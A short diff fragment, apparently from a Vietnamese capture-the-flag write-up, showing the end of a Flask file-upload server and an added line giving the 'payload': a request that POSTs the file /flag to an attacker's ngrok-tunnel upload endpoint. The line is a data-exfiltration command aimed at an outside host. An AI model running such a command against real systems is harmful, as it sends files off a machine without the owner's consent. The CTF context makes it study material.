@@ -25,3 +25,4 @@ def upload_file():
 if __name__ == '__main__':
    app.run(host="0.0.0.0",port=8888)``` 
    
+payload ở đây là `http://2360-2001-ee0-4f0f-d3b0-910-70-84f3-2af0.ngrok.io/upload -X POST -F file=@/flag`
